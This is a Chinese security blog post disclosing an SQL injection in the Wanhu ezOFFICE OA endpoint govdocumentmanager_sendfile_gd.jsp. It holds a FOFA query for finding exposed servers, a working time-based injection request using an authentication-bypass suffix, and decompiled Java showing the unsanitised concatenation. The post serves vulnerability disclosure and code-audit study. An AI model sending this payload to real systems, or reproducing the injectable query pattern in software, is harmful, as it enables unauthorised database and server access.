---
title: "万户OA govdocumentmanager_sendfile_gd.jsp SQL注入漏洞"
source: https://mrxn.net/jswz/defaultroot-ezOFFICE-govdocumentmanager_sendfile_gd-sqli.html
asset_dir: assets/万户oa-govdocumentmanager_sendfile_gd.jsp-sql注入漏洞
---

# 万户OA govdocumentmanager\_sendfile\_gd.jsp SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/1/14 18:20
- 1492浏览
- [0评论](#comment)
- 28分钟阅读

深入探索

SQL

万户网络

数据库

---

# 0x01 产品简介

万户OA [ezoffice](https://mrxn.net/tag/ezoffice "ezoffice") 是万户网络协同办公产品多年来一直将主要精力致力于中高端市场的一款OA协同办公[软件](#)产品，统一的基础管理平台，实现用户数据统一管理、权限统一分配、身份统一认证。统一规划门户网站群和协同办公平台，将外网信息维护、客户服务、互动交流和日常工作紧密结合起来，有效提高工作效率。

SQL注入防护

# 0x02 漏洞概述

万户 ezOFFICE modules/govoffice/gov\_documentmanager/govdocumentmanager\_sendfile\_gd.jsp 接口存在[SQL注入](https://mrxn.net/tag/sql%E6%B3%A8%E5%85%A5 "SQL注入")漏洞，未授权的攻击者可利用此[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E "漏洞")获取数据库权限，深入利用可获取服务器权限。

# 0x03 复现环境

本地环境 OR FOFA：app="ezOFFICE协同管理平台" || app="万户ezOFFICE协同管理平台" || app="万户网络-ezOFFICE"

深入探索

安全工具开发

安全研究报告

漏洞预警服务

# 漏洞复现

```
GET /defaultroot/modules/govoffice/gov_documentmanager/govdocumentmanager_sendfile_gd.jsp;.js?sendFileId=1%3Bwaitfor%20delay%270%3A0%3A4%27 HTTP/1.1
Host: ezoffice.mrxn.net
```

成功延时 4 秒

代码安全审计

[[![万户OA govdocumentmanager_sendfile_gd.jsp SQL注入漏洞](images/img-001-770bdfcb7f36.png)](https://mrxn.net/content/uploadfile/202501/2b581736773137.png)](https://mrxn.net/content/uploadfile/202501/2b581736773137.png)

# 漏洞分析

> 关于鉴权绕过，参考这篇文章：[万户 ezOFFICE ajax\_checkUserNum.jsp SQL注入漏洞](https://mrxn.net/jswz/defaultroot-ezOFFICE-ajax_checkUserNum-sqli.html)

modules/govoffice/gov\_documentmanager/govdocumentmanager\_sendfile\_gd.jsp 主要业务逻辑代码如下，非常简单！

深入探索

Web安全课程

传输层安全性协议

恶意软件分析工具

## SAVESIGNATURE

```
<%
//System.out.print("\n------ENTER 1--------\n");
String sendFileId = request.getParameter("sendFileId");
com.whir.ezoffice.workflow.common.util.WorkflowCommon workflowCommon = new com.whir.ezoffice.workflow.common.util.WorkflowCommon();
com.whir.govezoffice.documentmanager.bd.SendFileBD sendFileBD = new com.whir.govezoffice.documentmanager.bd.SendFileBD();
java.util.Map wfMap = sendFileBD.getDocWF(sendFileId, "2");
```

主要关注 这一行

漏洞扫描服务

```
java.util.Map wfMap = sendFileBD.getDocWF(sendFileId, "2");
```

跟进 `com.whir.govezoffice.documentmanager.bd.SendFileBD()` 下的 `getDocWF` 方法看下

```
public Map getDocWF(String id, String moduleId) {
        ParameterGenerator pg = new ParameterGenerator(2);
        Map result = null;

        try {
            EJBProxy ejbProxy = new GovDocumentManagerEJBProxy("SendFileEJB", "SendFileEJBLocal", SendFileEJBHome.class);
            pg.put(id, String.class);
            pg.put(moduleId, String.class);
            result = (Map)ejbProxy.invoke("getDocWF", pg.getParameters());
        } catch (Exception e) {
            logger.error("error to getDocWF information :" + e.getMessage());
        }

        return result;
    }
```

继续跟进 `SendFileEJB`

```
public Map getDocWF(String id, String moduleId) throws Exception {
        Map result = new HashMap();
        this.begin();

        try {
            Connection conn = this.session.connection();
            Statement stmt = conn.createStatement();
            ResultSet rs = stmt.executeQuery("SELECT WF_IMMOFORM_ID FROM EZOFFICE.WF_IMMOBILITYFORM WHERE WF_MODULE_ID=" + moduleId);
            String tableId = "";
            String processId = "";
            if (rs.next()) {
                tableId = rs.getString(1);
            }

            rs = stmt.executeQuery("SELECT WORKPROCESS_ID FROM WF_WORK WHERE MODULEID=2  AND WORKRECORD_ID=" + id);
            if (rs.next()) {
                processId = rs.getString(1);
            }
```

最终 `sendFileId` 也是拼接进SQL语句中，造成[SQL注入](https://mrxn.net/tag/sql%E6%B3%A8%E5%85%A5 "SQL注入")漏洞，还是这么朴实无华！

商务软件和生产力软件

# 最后

其他万户OA 相关漏洞  
[万户 ezOFFICE selectAmountField.jsp SQL注入漏洞](https://mrxn.net/jswz/defaultroot-ezOFFICE-selectAmountField-sqli.html)  
[万户OA系列漏洞](https://mrxn.net/tag/ezoffice)

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)
- [#ezOFFICE](https://mrxn.net/tag/ezOFFICE)

---

文章目录

- [1.0x01 产品简介](#toc-1-)
- [2.0x02 漏洞概述](#toc-2-)
- [3.0x03 复现环境](#toc-3-)
- [4.漏洞复现](#toc-4-)
- [5.漏洞分析](#toc-5-)
- [5.1.SAVESIGNATURE](#toc-5-1-)
- [6.最后](#toc-6-)

  
  

![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAABkCAYAAABw4pVUAAAN0UlEQVR4Aeyc3XbbSAyD8/X937kbDAxpSM/YTrqtc6E9RTEEQEoR7bh/Z399fHz8/ip+3/5T3+14kLQZh3E7xLuVy2s/8tQfPywtWGnyou94zugs9Ky0FXpO9Sr3iqaFfHwOeAmfA+9+AB/AnR4BGD6Yu55anPvQWUgdliZAnSWtZ6TNAPdA5WTUn3MYnE29Y9jnNPcVZPZYSIqL3/8EykLAm4bKj24z2wf3pN5xZs1+NPCMXR09DDUffeZcJ1rqcHQx1HmrjHLRw9KeATwbKve+spBuXvW/fwJ/tBC9QsAb11nIlwDWU4eVEcA+EOtgYHzuRADX6hOi6yykFkPNgmt5jwAcn6PJQe3VtQSwDmZpApDWb/MfLeTbV70at0/gjxeiV4YAjFc1mKUJuTJYB7O8jmTD3Qf3xoezhvMcf+bMAuegsvw5r7M0QWcB3KPzCnN25b+i/fFCXrnIlXn9CZSFaMMr7MaBXzFw//03PeBM6sxPLYZ1BqyDWdkZmTVzfHBPPHAdP3oYiHV8lgDjXR8j2XD0Vzg9nXtvWUg3v11fjd9+AmMh4FcCPObVVbJxcO+u7r3g/Kw/640/9+gMiAqSBcarPHUJfRZw+uDzp7z8Ac/93gjugcecvrGQFBe//wn8yivnKzzfNnjzszafwX7mw3095x+dwb09o9ldA2flCfF1FnoNRDpYOQEY77IY8LhWTn3fwfUO0dP7QSgLAW8eKud+wXrqmfNqAGdSh8H63KNzfDGsM8qtAM7DyclpngCnB/fnOZ8zOJdac1aIPzO4FyrPGZ2h+uD6FyB/IBcdxeKn+MB4C6tODE7tK7r6wb06zwDrmjcjmVnLOd6Oew58DWDXcujA+LrBHCMzV5wM1J7oncs7pJtX/e+fwFgI1O31TYN9MK9uMz3gDJiTBdfJzXrX4nUGz1jp0fqsXoNnRJ+5zwBno3dOLzgH95xM700dPzwWEvPi9z+BsZBsZ3c78cOrHPjVES/ZzuBcdOXhXpMewPBTvsTgHjD3JrAOZvm5Jzg16eA6fhjudeWFZHQWUkPtkTdjLGQWrvN7n0BZCHh7uSVY1/O2k40WBveCuefg1NPTM7s6OniG+lea9CB+6s7gWXD+QemjDJw5cK+ukR6dBbAH5u4rM6MsZDau83ueQFnIbntQtwuuX7nl3cxZB8+DynNG10odliYAoiWA8XuH3rMKJwPuSQZq3fX0SYd1NhmwD2suC9HAC+99AmMhsN5WvzVwLrq2njPYA7M8AVyDOfmZlRNmTWfY98hXT6BaSA3uTS1vBtgHszzwOT1Qa2WE+DoL4JzO3UsNZ0a5juTGQrp51e97Ass/ft/dTrYYH8jx4GSA8r2762mQPp/nOnoYPBPM0cVgDczSBKi1NEHXEXQWdA6g9sC6Tj6sOTv0TK/B17jeIbsn+CZ9LAS8HTDnXrLFMNhPLU52x+Ce+OoRoOrywZr8GWBdmWdIX89BnQG3+hYE18BN+Tj+sUNmdj6CtwMwvisAN+XjqIFxzgyo9cftv7GQ2/miH/AElgvpW4S6TXCt+09WZwFOT3X3pc0AjvJZ9gi2A6x/1zzHMhsor9RVZtZ0BvfoLIBrMEsTcg2x6kdQRoA646W/oFKjAG7WWQDXwHFt6TMO43YAxgO5lYXAHphjZl7qMDgnH86z6mR0FnoNzkcXgzXlBai1MjOUEcC52YN7beWrf8byHTI3Xud/+wTKQsBbBXO/lWyy66sa6gxw3WeoBnt9Dqz1nlOtOQLUHljXygrq3UG+AJ4B5uTBtTICEOvuFwQxgPEdQnmh62UhMS9+3xMYC9GmZuR2ooG3Cub44mTC0oTUUHvA9ewrL0TTeQbUnlUOnElfz0D1e075aFCz8lZI/hFDndWzYD/zx0J66Krf9wS+tJBsEc6tgs/9SwDr6dn5XV/VuxnR4fxlb/qhXj/Z+J2BQ3olC2ceOD4XjiG3Q2aFb/LIAykP/tJCjq7r8OwJfNsvCwHG5vo2U0P14f6VubuTzOi+9JU26+DrJge1lg7W1CdIE8C6zjOg6o96wFkwK7sCcFwCGM8SKifQ+8G5spCEL37fExgLAW8ntwHrOltNbmaoPfFgrccX97ngnq4rOwNqTnmwlpw0Aaoe/xHDugeqDrXWTF1T0FnQWdB5BtTesZA5cJ3f+wTKQrRBIbcEdXvgGszJzQxrD9a6esEemKWtAGsfrANHm74O4RBuB2kzgON7ffRb9O532/HDPacaznmApAFgXGcUnz+B6z6rLOQzd/148xMof4W7u5dssfOc716vk+06nL9S696uZ6erPx74FQjm6J3VE3RvV4NnQmXlM6uzPKHr4BnyhOsdoqfwgzAWAnVL2WK/T6i57s81rLNgHcxzTz/D84x6AFFB/xp6Ddx9Ty8DPgu4z8D9O/ozevcDam8CsNZzf+MvqFKAw2DOkHByqcXgLJilCcnCWo+vbADOgrnrqTtrVtfAM+QJ4BrM0gQ468yQLqQGZ3a1skJ8sWpB5xnShFmbz+MdMgvz+Tr/+ycwPtTBrwBtbkZuB+xD5fjfYfAsXQ98zhxpwq6ODu6Dk+M9Y3BPcuAaiHSw7mWFBIDj2x/4DJVXWWmZq7NwvUP0FH4QymfI7r6yxUecXvArI3V6UoP9WZ/PykHNgGswK9ORGeGd/0jvvb1OL9T7mHM5h9MTjg51Bri+3iF5Uj+Ex2dI7gW8JTD3bYJ1uOdkw+BMZkcPRwfngEjHH1kA43tz7+m1GsFZMEt7BbDPQ/XAda4PrnMd6Tk/Y2WF5HQWrndInsgP4bEQqJvu96bN7ZAseAaYk4//CqcHPONZT/KP+CszkgVfP3PBdfxw/NTgHJy8y6Sn81hIF6/6fU/gpV9lwblxOM+67bwCwtJWgLMPWEXG5wXce8Dw0gS1lg7WwCztKwD3wflHI+nP1xaOvuJkwsn0Gny9+OE3vENy6YtXT2AsBLytbDHcG6KH5YN7wTx7s/9Mjy9W3wxpQjSdhdRi1YLOM8D3BeZ4ygpQ9fgrhpqFWs/zwB5U7nOh+mMhPXTV73sCYyHarADeVr8deQLYh5OlC+kBe6nD8FgHEj1+H6K5AjA+Q3QWwDWYj8bPg3zh87j8IU+IqXMQLQz38+OJ0wfOwfn5E2/H6he6PxYi48LPeAJjIeAN55ZgXfdtqk5PZ6gzlH0GqD1Q636N1ECO450EZ51rJgCMTOqZk4V9Zs6vzlB7YV3vrjUWEjPcLxQd6nDl4F6THqQ3dRjOPvB5l93pmSUf/mwGuB/I2DvWdYRuSOsAlotPDuynzsyxkBQXv/8JjIWAt5XbydbgsQ7nh1jvzYzo4Flg7n5yMycD7okXPQzEOhh4+Ao9grdDZolv0vGLi9TgmVB59nPWHCE11B55QvfHQiJe/P4nMBaiTQngLe5uC+wrKygH1nR+BeoT4OxTLaQfTi+aGKoOrtUbQNXUJ4B1qCxPgFNXLcCpwf67ATine1DfDGlCNJ0FcE/Xx0IiXvz+JzAWAt6WNifsbkueEH8+RwPP6rWyQnSdBSDSwdKFCDrP6LpqYPmZAVXPHPXMiC6e9fkMnqWMAK5XGbAH5mTAtfqF6OGxkBQXv/8JjIVoUwJ4e2DutwdVh/331fRqrpAa6gzpYA3WrMwMqLnZ62ddW9jpUGfB/deUXs0Rei1NkC5eQZ4QD3xdaTPGQmbhOr/3CSwXki32W9vpyu08WL8SwLr61C/ovAI4q8wKsH9VJ5+5qcMrHXy9eGGwDpUzC8jxYGB8tvUZCYB9MC8XkvDF//4JjIWAt/PqFufbBPdC5TmjM9jXWZivpfoVgGekNz2q57NqcBYqJxcG+6rVNwNOT34wZ3SOvmL5wsqTJm/GWIiMCz/jCSz/ody8sdU5tz570V5l8KtvngHWMgNczxmdwXpyM4M95VZIFu5z997v8edZ0TMP3AuVlYOqgWt5M/qseNc7JE/ih/BYSLYVhvVWYa2/8rVkdnjuAc/tXmqwD+a5V2ewDqgcAMavbkbx+RPUejcb+EzXH0CZVd3zf5bZ9bkGz8h14/V6LCRmuId2OvgiQCLjLa5+oHwRUGtlBDWKBagZeYI8QecZ0jriR08dhvU15O96ut5r9QbxOsfvDL4fMC8X0puu+t89gfEvF8Hbgdc4t9dfBaq7l7oz+Fqzrn5h1nQGZ+UJ0mYAc1nOwHinqm9GCT0pwDN6LPO6rhrWPWAdzJkRvt4heno/CGMh2c4zfnTf4I0nA7XObLDeayCt4xUNZ30Ym4NmbazjM637wLhO1+canNF8AVxD5bknZ+WF1J3lCeBZ8cdCUlz8/idQFgLeFlTe3SZwWNq2ADx85SkjpHE+RwvD41lgH07uvWCv66l1fUE1OKt6hjxh1nSW1gGeAZV3uejgfFlIzIv/7hN4NP1/Wwh4w/1ieiUJsPaVly9AzUiboewzJN9zsJ4N1tMnftYL7uk59QY7b6en739bSL/QVX/vCfy1hWTj4FdTr+fbBWei9SzYB3P85MUrTXrQffCs+GK416QHYD+zwmAdTo7Xe1Pv+K8tZHfBS3/8BMpCstXOuxHKgV8VOgs9K02AdQ7Ov35VTsgMnVeAOkuZ9ED1up5aPTOii8EzwCxtBlgHc+YoM59VB11PDZ6RXFlIxIvf9wTGQsBbgse8us3dpqHOWvU+06DOANfpg7OG8ywfai3tEeDr79TV1w6+LphXGd0HVF+aMBaiw4Wf8QT+AwAA//8Pm1hoAAAABklEQVQDAJwZgeNJmLdFAAAAAElFTkSuQmCC)

手机扫码阅读
